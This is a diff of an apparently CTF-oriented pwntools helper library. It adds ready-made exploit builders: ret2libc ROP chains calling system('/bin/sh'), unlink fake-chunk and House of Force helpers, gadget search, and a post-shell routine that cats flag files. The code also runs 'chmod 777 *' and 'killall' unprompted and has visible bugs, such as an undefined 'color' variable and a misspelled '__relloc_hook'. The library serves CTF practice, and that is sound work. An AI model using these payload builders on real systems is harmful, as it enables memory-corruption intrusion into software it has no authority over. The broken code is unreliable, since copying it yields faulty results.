@@ -2,42 +2,410 @@
 @author: 不离
 @date: 2023-4-24
 Pwntools-External Functions Library
-开源包，任何人都可以使用并修改！
 """
 
 import os
+import ctypes
+import glob
 import random
 import re
-from typing import Optional, Tuple
+from enum import Enum
+from typing import Any, Literal, Optional, Tuple
 
 from pwn import *
 from LibcSearcher import *
 
 
-__version__ = '1.8'
+__version__ = '1.10'
 
 RESET = '\x1b[0m'
 
 
-def check_io_stream(io_stream):
+def random_color():
+    """生成随机颜色的 ANSI 代码。"""
+    return f'\x1b[01;38;5;{random.randint(1, 255)}m'
+
+
+def _colorful_print(msg, color = None):
+    if color is None:
+        color = random_color()
+
+    print(f"{color}{msg}{RESET}")
+
+
+def init_watch_list(*args, **kwargs):
+    global socketStatus, segments, globalPtrs
+
+    if socketStatus == SocketStatus.Remote:
+        return
+
+    _get_segment_base_addresses()
+
+    i = 0
+    while i < len(args):
+        arg = args[i]
+        if i + 1 < len(args) and isinstance(args[i + 1], str) and args[i + 1] in segments:
+            segment_name = args[i + 1]
+            base_address = segments[segment_name]
+            if isinstance(arg, str):
+                final_address = _sym_addr_internal(arg)
+                globalPtrs[arg] = final_address
+            elif isinstance(arg, int):
+                final_address = base_address + arg
+                globalPtrs[hex(arg)] = final_address
+            else:
+                print(f"Unknown argument type: {type(arg)}")
+            i += 2
+        else:
+            print(f"Argument '{arg}' without valid segment name")
+            i += 1
+
+    for key, value in kwargs.items():
+        if key in segments:
+            base_address = segments[key]
+            if isinstance(value, str):
+                symbol_address = _sym_addr_internal(value)
+                final_address = base_address + symbol_address
+                globalPtrs[value] = final_address
+            elif isinstance(value, int):
+                final_address = base_address + value
+                globalPtrs[hex(value)] = final_address
+            else:
+                print(f"Unknown value type for keyword argument '{key}': {type(value)}")
+        else:
+            print(f"Unknown keyword argument '{key}'")
+
+    show_watch_list()
+
+
+def show_watch_list():
+    global globalPtrs
+
+    if socketStatus == SocketStatus.Remote:
+        return
+    
+    color = random_color()
+
+    _colorful_print("==================== WATCH LIST ====================", color)
+
+    if not globalPtrs:
+        print("No entries in the watch list.")
+    else:
+        for key, value in globalPtrs.items():
+            _colorful_print(f"Key: {key:<20} Address: {hex(value):>17}", color)
+
+    _colorful_print("==================== WATCH LIST ====================", color)
+
+
+def get_seg_addr(arg):
+    """
+    使用 /proc/pid/maps 获取各项地址
+    
+    Args:
+        arg: 段名称 如 libc
+
+    Returns:
+        addr: 段起始地址
+    """
+    global arenaAddr, segments, socketStatus, libcBaseAddress
+
+    color = random_color()
+
+    if socketStatus == SocketStatus.Local:
+        _colorful_print("============NOTE============", color)
+        _colorful_print("Please DO NOT use get_seg_addr() outside of local or without leaking the Libc Base Address.", color)
+        _colorful_print("This is for DEBUG use only.", color)
+        _colorful_print("============NOTE============", color)
+
+        _get_segment_base_addresses()
+
+        if arg.lower() not in segments:
+            raise ValueError(f"Invalid segment name: {arg}. Available segments: {', '.join(segments.keys())}")
+
+        if arg.lower() == "libc":
+            if libcBaseAddress is not None and libcBaseAddress != segments[arg] and arenaAddr != None:
+                _colorful_print("============WARNING============", color)
+                _colorful_print("Current Libc Base Address was not Libc Base Address.", color)
+                _colorful_print(f"Current: {hex(libcBaseAddress)}", color)
+                _colorful_print(f"Correct: {hex(segments[arg])}", color)
+                _colorful_print(f"Offset: (Arena Offset with Correct Libc Base): {hex(arenaAddr - segments[arg])}", color)
+                _colorful_print("============WARNING============", color)
+                set_libc_base(segments[arg])
+
+                return segments[arg]
+            else:
+                return segments[arg]
+
+        else:
+            return segments[arg]
+    else:
+        _colorful_print("You're using get_seg_addr() in a non-local environment. Skipping...", color)
+        return None
+
+
+def _get_segment_base_addresses():
+    global binaryElfFilePath, segments
+
+    if segments is not None:
+        fileName = binaryElfFilePath.strip("./")
+
+        result = _get_segments_base_addr()
+
+        result = result.split("\n")
+        code_flag = 0
+        libc_flag = 0
+        ld_flag = 0
+
+        for r in result:
+            rc = re.compile(r"^([0-9a-f]{6,14})-([0-9a-f]{6,14})", re.S)
+            rc = rc.findall(r)
+            if len(rc) != 1 or len(rc[0]) != 2:
+                continue
+            start_addr = int(rc[0][0], base=16)
+            end_addr = int(rc[0][1], base=16)
+            if (fileName is not None) and (not code_flag) and r.endswith(fileName):
+                code_flag = 1
+                segments['code'] = start_addr
+            elif (not libc_flag) and ("/libc" in r):
+                libc_flag = 1
+                segments['libc'] = start_addr
+            elif (not ld_flag) and ("/ld" in r):
+                ld_flag = 1
+                segments['ld'] = start_addr
+            elif "heap" in r:
+                segments['heap'] = start_addr
+            elif "stack" in r:
+                segments['stack'] = start_addr  
+            elif "vdso" in r:
+                segments['vdso'] = start_addr
+    else:
+        return segments
+
+
+def _get_segments_base_addr():
+    global ioStream
+
+    pid = ioStream.proc.pid
+
+    command = f"cat /proc/{pid}/maps"
+
+    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    stdout, stderr = result.communicate()
+    return stdout
+
+
+def init_ctypes_srand():
+    global ctypesElf
+    try:
+        ctypesElf = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
+        ctypesElf.srand.argtypes = [ctypes.c_uint]
+    except OSError as e:
+        ctypesElf = None
+        raise OSError(f"Error loading libc.so.6: {e}")
+
+
+def _patch_elf():
+    """
+    自动替换二进制文件的 Libc 文件为 load_libc() 函数的参数
+
+    当已被替换时，直接返回
+    当 Libc 文件路径为 Null 时也直接返回
+    """
+    global binaryElfFilePath, libcElfFilePath
+
+    if _check_binary_file(libcElfFilePath) == CheckStatement.Null:
+        return
+
+    tempPath = os.path.dirname(libcElfFilePath)
+    pattern = os.path.join(tempPath, 'ld*.so')
+    ldFiles = glob.glob(pattern)
+
+    command = f"replace-elf {ldFiles[0]} {libcElfFilePath} {binaryElfFilePath}"
+
+    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    stdout, stderr = result.communicate()
+
+    recv = os.popen(f"ldd {binaryElfFilePath}").read()
+
+    if libcElfFilePath in recv:
+        return
+
+    if "错误" in stdout:
+        file = binaryElfFilePath.strip('./')
+        os.system(f"killall {file}")
+        _patch_elf()
+
+    raise RuntimeError("Libc Replaced. Please restart the program.")
+
+
+def get_time_seed(arg):
+    """
+    基于给入的时间获取随机数种子
+
+    Args:
+        arg: 时间
+
+    Returns:
+        seed: 随机数种子
+    """
+    global ctypesElf
+
+    try:
+        _check_binary_file(ctypesElf)
+    except Exception:
+        init_ctypes_srand()
+
+    seed = ctypesElf.time(arg)
+
+    return seed
+
+
+def get_random(seed):
+    """
+    基于给入的种子生成随机数
+
+    Args:
+        seed: 随机数种子
+
+    Returns:
+        num: 随机数
+    """
+    global ctypesElf
+
+    try:
+        _check_binary_file(ctypesElf)
+    except Exception:
+        init_ctypes_srand()
+
+    if ctypesElf is None:
+        raise Exception("Failed to initialize ctypesElf. Check if libc.so.6 is available.")
+
+    ctypesElf.srand(seed)
+    return ctypesElf.rand()
+
+
+def _check_io_stream(io_stream):
     """检查IO流是否有效"""
     if io_stream is None or io_stream == "":
-        raise RuntimeError("Error: Please use get_utils() first.")
+        raise Exception("Error: Please use get_utils() first.")
 
 
-def check_libc_loaded(libc_elf):
+def _check_libc_loaded(libc_elf):
     """检查Libc是否已加载"""
     if libc_elf is None:
-        raise RuntimeError("Error: Please use load_libc() first.")
+        raise Exception("Error: Please use load_libc() first.")
 
 
-def check_binary_file(binary_file_path):
+def _check_binary_file(binary_file_path=None):
     """检查二进制文件路径是否有效"""
-    if binary_file_path is None or binary_file_path == "":
-        raise RuntimeError("Error: Binary file path is invalid.")
+    if binary_file_path.upper() == "NULL":
+        return CheckStatement.Null
+
+    if not binary_file_path or not os.path.exists(binary_file_path) or binary_file_path is None:
+        raise Exception("Error: Binary file path is invalid.")
+    
+
+def Byte(content: Optional[int] = None):
+    if content is not None:
+        return bytes(str(content).encode())
+    else:
+        raise ValueError("Content is invaild.")
+    
+
+def _check_protect():
+    """
+    打印二进制文件的保护与沙箱状态
+    """
+    global binaryElfFilePath
+
+    tempFilePath = binaryElfFilePath.replace('./', '')
+    tempFilePath = os.getcwd() + tempFilePath
+    
+    _check_binary_file(binaryElfFilePath)
+    
+    command_checksec = f"checksec {binaryElfFilePath}"
+    command_seccomp = f"seccomp-tools dump {binaryElfFilePath}"
+    
+    result_checksec = subprocess.Popen(command_checksec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    result_seccomp = subprocess.Popen(command_seccomp, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    
+    try:
+        stdout_seccomp, stderr_seccomp = result_seccomp.communicate(timeout=0.2)
+        result_seccomp.kill()
+    except subprocess.TimeoutExpired:
+        result_seccomp.kill()
+        stdout_seccomp, stderr_seccomp = '', 'seccomp-tools timed out.'
+
+    protection_info = {}
+
+    stdout_checksec, stderr_checksec = result_checksec.communicate()
+    
+    protection_info['Checksec Output'] = stderr_checksec.strip()
+    protection_info['Seccomp Output'] = stdout_seccomp.strip()
+
+    color = random_color()
+
+    os.system("killall seccomp-tools")
+
+    _colorful_print("=============================================", color)
+    for key, value in protection_info.items():
+        _colorful_print(f"{key}: {value}", color)
+    _colorful_print("=============================================", color)
 
 
-def load_libc(binary: Optional[str] = None) -> Optional[ELF]:
+def get_libc_base_by_arena(addr: int) -> int:
+    """
+    基于 main_arena 与 __malloc_hook 的偏移计算出 Libc 基址
+
+    Args:
+        addr: 泄漏得到的 main_arena 地址
+
+    Returns:
+        libcBaseAddress: Libc 基址
+    """
+    global arch, arenaAddr, arenaFlag, libcBaseAddress, libcElf, libcElfFilePath, libcVersion, socketStatus
+
+    _check_binary_file(libcElfFilePath)
+    _check_libc_loaded(libcElf)
+
+    arenaAddr = addr
+    rand_val = random_color()
+
+    try:
+        if socketStatus == SocketStatus.Local:
+            libc_base = get_seg_addr('libc')
+            offset = addr - libc_base
+
+            _colorful_print("===================DEBUG-USE-ONLY===================", rand_val)
+            _colorful_print(f"Main arena offset based on local debug: {hex(offset)}.", rand_val)
+            _colorful_print("===================DEBUG-USE-ONLY===================", rand_val)
+            arenaFlag = True
+
+            set_libc_base(libc_base)
+            return libc_base
+
+        else:
+            try:
+                libcBaseAddress = addr - libcElf.sym['__malloc_hook']
+                libcBaseAddress = libcBaseAddress & 0xFFFFFFFFFFFFF000
+                set_libc_base(libcBaseAddress)
+                arenaFlag = True
+
+                return libcBaseAddress
+            except ValueError:
+                offset = libcElf.sym['__malloc_hook'] - libcElf.sym['__relloc_hook']
+                main_arena_offset = libcElf.sym['__malloc_hook'] + offset * 2
+                libcBaseAddress = libcBaseAddress - main_arena_offset
+                libcBaseAddress = libcBaseAddress & 0xFFFFFFFFFFFFF000
+                set_libc_base(libcBaseAddress)
+                arenaFlag = True
+
+                return libcBaseAddress
+    except:
+        raise Exception(f"Unknown Error. Based on the offset, {libcBaseAddress} is the libc base address.")
+
+
+def load_libc(binary: Optional[str] = None, forceLoad: Optional[bool] = False) -> Optional[ELF]:
     """
     加载指定的 Libc 文件。
 
@@ -47,16 +415,51 @@ def load_libc(binary: Optional[str] = None) -> Optional[ELF]:
     Returns:
         ELF: 加载的 Libc ELF 对象，如果未提供路径则返回 None。
     """
-    global libcElf
-    global libcElfFilePath
+    global arch, libcElf, libcElfFilePath, socketStatus
 
-    check_binary_file(binary)
+    if _check_binary_file(binary) is CheckStatement.Null:
+        _colorful_print("No Libc file provided, Considering running at no libc mode.")
+        return
+
     libcElfFilePath = binary
+
+    if not forceLoad:
+        tempArch = _check_if_file_is_x64(libcElfFilePath)
+
+        if tempArch == Arch.Null:
+            raise Exception(f"Libc Arch is NULL.")
+        
+        if tempArch is not arch:
+            raise Exception(f"Select libc file was not pairing with the elf file. Binary file arch: {arch}, Libc file arch: {tempArch}")
+
+    _get_libc_version(libcElfFilePath)
     libcElf = ELF(binary)
+    
+    if socketStatus == SocketStatus.Local and not forceLoad:
+        _patch_elf()
+
     return libcElf
 
 
-def calculate_libc_base(addr: int, name: str) -> int:
+def _get_libc_version(filePath):
+    """
+    获取 Libc 版本
+    通常不会直接调用，内部自动调用。
+    """
+    global libcVersion, libcUbuntuVersion
+
+    pattern = r'(\d+\.\d+)-(\S+)\s*\)'
+    command = f"strings {filePath} | grep 'GNU C Library'"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    match = re.search(pattern, result.stdout)
+    if match:
+        libcVersion = match.group(1)
+        libcUbuntuVersion = match.group(2)
+    else:
+        print(f"UNKNOWN Libc type: {result.stdout}.")
+
+
+def _calculate_libc_base(addr: int, name: str) -> int:
     """
     计算 Libc 基址。
 
@@ -67,13 +470,30 @@ def calculate_libc_base(addr: int, name: str) -> int:
     Returns:
         int: Libc 基址。
     """
-    global libcBaseAddress
-    global libcElf
-    check_libc_loaded(libcElf)
+    global libcBaseAddress, libcElf
+    _check_libc_loaded(libcElf)
 
     libcBaseAddress = addr - libcElf.sym[name]
     return libcBaseAddress
 
+
+def calc_house_of_force_offset(targetAddr: int, topChunk: int) -> int:
+    """
+    懒人计算 House of Force 偏移地址。
+
+    Offset = TargetAddr - 0x20 - CurrenntTopChunkAddr
+
+    Args:
+        targetAddr (int): 想劫持的地址
+        topChunk (str): 当前 Top Chunk 地址
+
+    Returns:
+        int: 偏移
+    """
+    offset = targetAddr - 0x20 - topChunk
+    _colorful_print(f"The offset of House of Force to hijack {hex(targetAddr)} is {hex(offset)}")
+
+    return offset
 
 def search_one_gadget(index=0):
     """
@@ -85,28 +505,73 @@ def search_one_gadget(index=0):
     Returns:
         one_gadget_offset
     """
-    global libcElf
-    global libcElfFilePath
-    check_libc_loaded(libcElf)
+    global libcElf, libcElfFilePath
+
+    color = random_color()
+    _check_libc_loaded(libcElf)
 
     os.chdir(os.getcwd())
     recv = os.popen('one_gadget ' + libcElfFilePath).read()
-    regex = re.compile(r"(.*exec)")
+    regex = re.compile(r'([0x0-9a-fA-F]+)\s+exec')
     ogs = re.findall(regex, recv)
     one_gadget_list = []
     for i in ogs:
-        print(f"{random_color()}One_Gadget Found =======> [{i}]{RESET}")
-        one_gadget_list += i
-    return one_gadget_list[index]
+        _colorful_print(f"One_Gadget Found =======> [{i}]", color)
+        one_gadget_list.append(i)
+    if index < len(one_gadget_list):
+        _colorful_print(f"Selected the {index + 1} One_gadget. ============> Offset: {hex(int(one_gadget_list[index], 16))}", color)
+        return int(one_gadget_list[index], 16)
+    return None
+
+
+def UnlinkChunkPayloadGenerator(chunkSize, nextChunkSize, chunkFd, chunkBk):
+    """
+    懒人生成 Unlink Fake Chunk Payload
+    只适用于向前合并。
+
+    Args:
+        chunkSize: 伪造 Chunk 的大小
+        nextChunkSize: 伪造 Chunk 下一个 Chunk 的大小
+        chunkFd: 伪造 Chunk 的 FD 指针
+        chunkBk: 伪造 Chunk 的 BK 指针
+
+    Returns:
+        Payload
+    """
+    if chunkSize is None or nextChunkSize is None or chunkFd is None or chunkBk is None:
+        raise ValueError("Invaild paramater, Please fill all the blank.")
+
+    if chunkSize < 0x30:
+        raise ValueError(f"Invaild fake chunk size: {chunkSize}")
+
+    Payload = p64(0) + p64(chunkSize)
+    Payload += p64(chunkFd) + p64(chunkBk)
+    Payload += p64(0) * int((chunkSize - 0x20) / 8)
+    Payload += p64(chunkSize) + p64(nextChunkSize)
+
+    _colorful_print(f"Generating Fake Chunk Payload with size: {hex(chunkSize)}, Next chunk size: {hex(nextChunkSize)}.")
+
+    return Payload
 
 
 def get_libc_base(name: str, addr: int) -> int:
-    global libcBaseAddress
-    global libcElf
+    """
+    获取 Libc 基址
 
-    check_libc_loaded(libcElf)
+    Args:
+        name: 泄漏符号名
+        addr: 泄漏地址 
+
+    Returns:
+        libc 基址
+    """
+    global libcBaseAddress, libcElf
+
+    _check_libc_loaded(libcElf)
     
-    libcBaseAddress = calculate_libc_base(addr, name)
+    libcBaseAddress = _calculate_libc_base(addr, name)
+
+    set_libc_base(libcBaseAddress)
 
     return libcBaseAddress
 
@@ -121,14 +586,13 @@ def search_reg_gadgets(reg=None):
     Returns:
         reg_offset
     """
-    global binaryElf
-    global binaryElfFilePath
+    global binaryElf, binaryElfFilePath
 
     os.chdir(os.getcwd())
 
-    check_binary_file(binaryElfFilePath)
+    _check_binary_file(binaryElfFilePath)
     if reg is None:
-        raise RuntimeError("Please specify a register.")
+        raise Exception("Please specify a register.")
 
     command = f'ROPgadget --binary {binaryElfFilePath} | grep "{reg}"'
     recv = os.popen(command).read()
@@ -143,7 +607,7 @@ def search_reg_gadgets(reg=None):
 
         if match:
             if unique_gadget is None:
-                print(f"{random_color()}Gadget Found =======> [{match.group()}]{RESET}")
+                _colorful_print(f"Gadget Found =======> [{match.group()}]")
                 unique_gadget = int(match.group(1), 16)
                 break
 
@@ -162,12 +626,11 @@ def sym_addr(sym=None):
     Returns:
         libc_base, system, binsh | sym_addr
     """
-    global libcElf
-    global libcBaseAddress
-    check_libc_loaded(libcElf)
+    global libcBaseAddress, libcElf
+    _check_libc_loaded(libcElf)
 
     if libcBaseAddress == None:
-        raise RuntimeError("Please use get_libc_base() first.")
+        raise Exception("Please use get_libc_base() first.")
     
     if sym == None:
         system = libcBaseAddress + libcElf.sym['system']
@@ -178,37 +641,15 @@ def sym_addr(sym=None):
         sym_addr = libcBaseAddress + libcElf.sym[sym]
 
         return sym_addr
+
+
+def _sym_addr_internal(sym=None):
+    global libcElf, segments
+    _check_libc_loaded(libcElf)
     
+    sym_addr = segments['libc'] + libcElf.sym[sym]
 
-def sym_addr_base(sym=None):
-    """
-    懒人获取一系列 Libc 符号地址，使用本地 Libc 文件进行搜索。
-    若想获取云端地址，请使用 libc_search 函数。
-    默认返回 libc_base, system, binsh ，若 sym 有定义则返回 sym 的地址。
-
-    Args:
-        libcBase: Libc 基址
-        sym:  需要获取的符号
-
-    Returns:
-        system, binsh | sym_addr
-    """
-    global libcElf
-    global libcBaseAddress
-    check_libc_loaded(libcElf)
-
-    if libcBaseAddress == None:
-        print("Please use get_libc_base() first.")
-    
-    if sym == None:
-        system = libcBaseAddress + libcElf.sym['system']
-        binsh = libcBaseAddress + next(libcElf.search(b'/bin/sh\x00'))
-        
-        return system, binsh
-    else:
-        sym_addr = libcBaseAddress + libcElf.sym[sym]
-
-        return sym_addr
+    return sym_addr
 
 
 def Ret2Csu(payload, r12, rdi, r14, r13, csu_front, csu_rear, syscallAddr):
@@ -229,7 +670,7 @@ def Ret2Csu(payload, r12, rdi, r14, r13, csu_front, csu_rear, syscallAddr):
     """
     global ioStream
 
-    check_io_stream(ioStream)
+    _check_io_stream(ioStream)
 
     rdi_addr = search_reg_gadgets('pop rdi')
 
@@ -250,6 +691,25 @@ def Ret2Csu(payload, r12, rdi, r14, r13, csu_front, csu_rear, syscallAddr):
     ioStream.sendline(payload_internal)
 
 
+def set_libc_base(addr=None):
+    """
+    设置 Libc 基址
+    一般在堆题用得到，因为没办法直接使用符号获取地址。
+
+    Args:
+        addr (int): Libc 基址
+    """
+    global libcElf, libcBaseAddress
+
+    _check_libc_loaded(libcElf)
+
+    if addr is None or hex(addr)[-2:] != '00':
+        raise ValueError(f"Invalid Libc base addr: {hex(addr) if addr else 'None'}.")
+
+    libcBaseAddress = addr
+    _colorful_print(f"Libc Base Address has been set to {hex(libcBaseAddress)}.")
+
+
 def leak_addr(i=None):
     """
     获取泄露的内存地址。
@@ -262,23 +722,25 @@ def leak_addr(i=None):
     """
     global ioStream
 
-    check_io_stream(ioStream)
+    _check_io_stream(ioStream)
 
-    internal = i
+    internal = 0
 
     if i == None:
-        if arch == 1:
-            internal == 2
-        if arch == 0:
-            internal == 0
-        else:
-            internal == 1
+        if arch == Arch.x64:
+            internal = 2
+        if arch == Arch.x86:
+            internal = 0
+    else:
+        internal = i
 
     address_methods = {
-        0: lambda: u32(ioStream.recv(4)),
+        0: lambda: u32(ioStream.recvuntil(b'\xf7')[-4:]),
         1: lambda: u64(ioStream.recvuntil(b'\x7f')[:6].ljust(8, b'\x00')),
         2: lambda: u64(ioStream.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')),
-        3: lambda: u64(ioStream.recv(8))
+        3: lambda: u64(ioStream.recv(8)),
+        4: lambda: u32(ioStream.recv(4)),
+        5: lambda: u32(ioStream.recvuntil(b'\xff')[-4:]),
     }
 
     return address_methods[internal]()
@@ -301,30 +763,25 @@ def libc_search(func, addr_i, onlineMode=False):
     return libc_base_i, libc_base_i + libc_i.dump('system'), libc_base_i + libc_i.dump('str_bin_sh')
 
 
-def debug(io=None, breakpoint=None):
+def debug(breakpoint=None):
     """
     快捷GDB Attach函数。
 
     Args:
-        io: IO流
         breakpoint: 断点地址
     """
     global ioStream
 
-    check_io_stream(ioStream)
-
-    ioInternal = io
-    if io == None:
-        ioInternal = ioStream
+    _check_io_stream(ioStream)
 
     if breakpoint is not None:
-        gdb.attach(ioInternal, gdbscript='b *{}'.format(breakpoint))
+        gdb.attach(ioStream, gdbscript='{}'.format(breakpoint))
     else:
-        gdb.attach(ioInternal)
+        gdb.attach(ioStream)
     pause()
 
 
-def recv_int_addr(num):
+def recv_int_addr(num=16):
     """
     获取泄露的Int地址，一般是格式化字符串泄露Canary等。
 
@@ -336,11 +793,12 @@ def recv_int_addr(num):
         int: Int地址的十进制格式。
     """
     global ioStream
-    check_io_stream(ioStream)
+    _check_io_stream(ioStream)
+
+    received = ioStream.recv(num)
 
     try:
-        received = ioStream.recv(num)
-        return int(received,)
+        return int(received)
     except ValueError:
         if received.startswith(b'0x'):
             return int(received, 16)
@@ -348,52 +806,95 @@ def recv_int_addr(num):
             raise
 
 
-def payload_generator(paddingSize=None, libcBaseAddr=None, stackAligned=False):
+def decode_with_null_replacement(data):
+    decoded_str = ""
+    for byte in data:
+        if 32 <= byte <= 126 or byte == 10:
+            decoded_str += chr(byte)
+    return decoded_str
+
+
+def send_utils():
+    """
+    懒人构建 GetShell 后操作。
+    """
+    global ioStream
+
+    _check_io_stream(ioStream)
+
+    recv = f'{random_color()}============Summary============\n'
+    
+    commands = [
+        "find '/flag.txt' -exec cat {} \;",
+        "find '/flag' -exec cat {} \;",
+        "uname -a"
+    ]
+
+    ioStream.recvlines(timeout=0.5)
+
+    for command in commands:
+        ioStream.sendline(command.encode())
+        recv_data = ioStream.recvline()
+        recv += decode_with_null_replacement(recv_data)
+    
+    recv += f'==============================={RESET}\n'
+    print(recv)
+
+
+def payload_generator(paddingSize=None, stackAligned: Optional[bool] = None, canary: Optional[bool] = None, ):
     """
     懒人构建 Payload
     目前只有 GetShell 的 Payload
 
     Args:
         paddingSize: 垃圾数据大小
-        libcBaseAddr: Libc 基址
         stackAligned: 栈对齐，默认关闭
+        canary: Canary 数据
 
     Returns:
         payload: 最终 Payload
     """
-    global arch
+    global arch, libcBaseAddress
 
-    if paddingSize == None:
-        print("Please input paddingSize argument.")
-        return
+    if libcBaseAddress is None:
+        raise Exception("Please use set_libc_base() first.")
+    
+    if paddingSize is None:
+        raise Exception("Please input paddingSize argument.")
     
     rdi = search_reg_gadgets('pop rdi')
-    system, binsh = sym_addr_base()
+    useless, system, binsh = sym_addr()
+    payload = cyclic(paddingSize)
+    stackAligned_i = False
 
-    if libcBaseAddr == None:
-        print("Please input libc base addr.")
-        return
+    color = random_color()
 
-    if stackAligned and arch == 1:
-        print(f"{random_color()}========== Generating Payload with Stack Aligned for x64. =========={RESET}")
-        ret = search_reg_gadgets('ret')
-        payload = cyclic(paddingSize) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
-        return payload
-    
-    if stackAligned == False and arch == 1:
-        print(f"{random_color()}========== Generating Payload with No Stack Aligned for x64. =========={RESET}")
-        payload = cyclic(paddingSize) + p64(rdi) + p64(binsh) + p64(system)
-        return payload
-    
-    if arch == 0:
-        print(f"{random_color()}========== Generating Payload for x86. =========={RESET}")
-        payload = cyclic(paddingSize) + p32(system) + p32(0xdeadbeef) + p32(binsh)
-        return payload
+    if stackAligned is None:
+        if float(libcVersion) >= 2.27 and arch == Arch.x64:
+            _colorful_print(f"Libc version {libcVersion}, No Stack Aligned argument, Assuming Stack Aligned.", color)
+            stackAligned_i = True
+    else:
+        stackAligned_i = stackAligned
 
+    if canary is not None:
+        if hex(canary)[-2:] != '00':
+            raise RuntimeError(f"The input Canary {hex(canary)} is invalid.")
+        payload += p64(canary) if arch == Arch.x64 else p32(canary)
+        payload += p64(0xdeadbeef) if arch == Arch.x64 else p32(0xdeadbeef)
 
-def random_color():
-    """生成随机颜色的 ANSI 代码。"""
-    return f'\x1b[01;38;5;{random.randint(1, 255)}m'
+    if arch == Arch.x64:
+        ret = search_reg_gadgets('ret') if stackAligned_i else None
+        if stackAligned_i:
+            _colorful_print(f"========== Generating Payload with Canary: {canary is not None} Stack Aligned: {stackAligned_i} for x64. ==========", color)
+            payload += p64(ret) + p64(rdi) + p64(binsh) + p64(system)
+        else:
+            _colorful_print(f"========== Generating Payload with Canary: {canary is not None} Stack Aligned: {stackAligned_i} for x64. ==========", color)
+            payload += p64(rdi) + p64(binsh) + p64(system)
+    else:
+        _colorful_print("========== Generating Payload for x86. ==========", color)
+        payload += p32(system) + p32(0xdeadbeef) + p32(binsh)
+
+    return payload
 
 
 def show_addr(msg, *args, **kwargs):
@@ -406,39 +907,80 @@ def show_addr(msg, *args, **kwargs):
         **kwargs: 需要打印的内存地址
     """
     hex_color = '\x1b[01;38;5;110m'
-    
-    formatted_msg = f"{random_color()}{msg}{RESET}:"
-    print(formatted_msg)
+
+    _colorful_print(msg, color)
 
     for arg in args:
         hex_text = hex(arg)
-        colored_hex_text = f"{hex_color}{hex_text}{RESET}"
-        print(f"============> {colored_hex_text}")
+        _colorful_print(f"============> {hex_text}", hex_color)
 
     for key, value in kwargs.items():
         hex_text = hex(value)
-        colored_hex_text = f"{hex_color}{hex_text}{RESET}"
-        print(f"============> {key}: {colored_hex_text}")
+        _colorful_print(f"============> {key}: {hex_text}", hex_color)
 
 
-def init_env(arch_i=None, loglevel='debug'):
+def _check_if_file_is_x64(filePath=None):
+    if filePath == None or filePath == '':
+        raise Exception(f"The input filepath {filePath} is invaild.")
+
+    pattern = r'ELF (\d+)-bit'
+    recv = os.popen('file ' + filePath).read()
+    match = re.search(pattern, recv)
+
+    if match:
+        if match.group(1) == '64':
+            return Arch.x64
+        else:
+            return Arch.x86
+    else:
+        return Arch.Null
+
+
+def init_env(loglevel='debug', arch_i=None):
     """
     初始化环境，默认为 amd64, debug 级日志打印。
 
     Args:
-        arch: 系统架构，1表示64位，0表示32位
         log_level: 日志打印等级
+        arch: 系统架构，1表示64位，0表示32位
     """
-    global arch
-    if arch_i == None:
-        raise RuntimeError("Please set arch first.")
+    global arch, binaryElfFilePath, socketStatus
 
-    if arch_i == 1:
-        arch = 1
+    _check_binary_file(binaryElfFilePath)
+
+    arch = _check_if_file_is_x64(binaryElfFilePath)
+
+    if arch_i == None and arch == Arch.Null:
+        raise Exception("Please set arch first.")
+
+    if arch_i == 1 or arch == Arch.x64:
         context(arch='amd64', os='linux', log_level=loglevel)
-    else:
-        arch = 0
+    elif arch_i == 0 or arch == Arch.x86:
         context(arch='i386', os='linux', log_level=loglevel)
+
+    _colorful_print(f"Arch: x86_64, OS: {subprocess.check_output('uname', shell=True).decode().strip()}, Socket Status: {socketStatus}")
+
+
+def init_global_var():
+    global arenaAddr, arenaFlag, binaryElf, binaryElfFilePath, libcBaseAddress, libcElf, libcElfFilePath, libcUbuntuVersion, libcVersion, ioStream, arch, ctypesElf, socketStatus, segments, globalPtrs, colorTime, lastColor
+    
+    arenaAddr = None
+    arenaFlag = False
+    binaryElf = None
+    binaryElfFilePath = None
+    libcBaseAddress = None
+    libcElf = None
+    libcElfFilePath = None
+    libcUbuntuVersion = None
+    libcVersion = None
+    ioStream = None
+    arch = Arch.Null
+    ctypesElf = None
+    socketStatus = SocketStatus.Null
+    segments = {}
+    globalPtrs = {}
+    colorTime = 0
+    lastColor = None
 
 
 def get_utils(binary: Optional[str] = None, local: bool = True, ip: Optional[str] = None, port: Optional[int] = None) -> Tuple[Optional[tube], Optional[ELF]]:
@@ -455,17 +997,28 @@ def get_utils(binary: Optional[str] = None, local: bool = True, ip: Optional[str
         io: IO流
         elf: ELF引用
     """
-    global binaryElfFilePath
-    global binaryElf
-    global ioStream
+    init_global_var()
 
-    binaryElfFilePath = binary
-    binaryElf = ELF(binary) if binary is not None else None
+    os.chdir(os.getcwd())
+    os.system("chmod 777 *")
+
+    global binaryElf
+    global binaryElfFilePath
+    global ioStream
+    global socketStatus
+
+    binaryElfFilePath = binary  if binary is not None else "NULL"
+    binaryElf = ELF(binary) if binary is not None else "NULL"
 
     if not local:
         ioStream = remote(ip, port)
+        socketStatus = SocketStatus.Remote
     else:
-        ioStream = process(binary) if binary is not None else None
+        if _check_binary_file(binaryElfFilePath) is CheckStatement.Null:
+            raise Exception("No binary file and no remote socket provided. This is invaild.")
+        _check_protect()
+        ioStream = process(binary) if binary is not None else "NULL"
+        socketStatus = SocketStatus.Local
 
     return ioStream, binaryElf
 
@@ -481,7 +1034,7 @@ def fmt_canary():
     """
     global binaryElfFilePath
 
-    check_binary_file(binaryElfFilePath)
+    _check_binary_file(binaryElfFilePath)
 
     i = 1
 
@@ -501,7 +1054,7 @@ def fmt_canary():
             elif '0x' in recv:
                 matches = pattern.findall(recv)
                 if matches:
-                    print(f"{random_color()}Canary's offset is at ===========> {str(i)} ({str('%' + str(i) + '$p')}){RESET}")
+                    _colorful_print(f"Canary's offset is at ===========> {str(i)} ({str('%' + str(i) + '$p')})")
                     return
                 else:
                     i = i + 1
@@ -512,53 +1065,50 @@ def fmt_canary():
             continue
 
 
-def fmtstraux(size: Optional[int] = 10, x64: bool = True) -> Optional[int]:
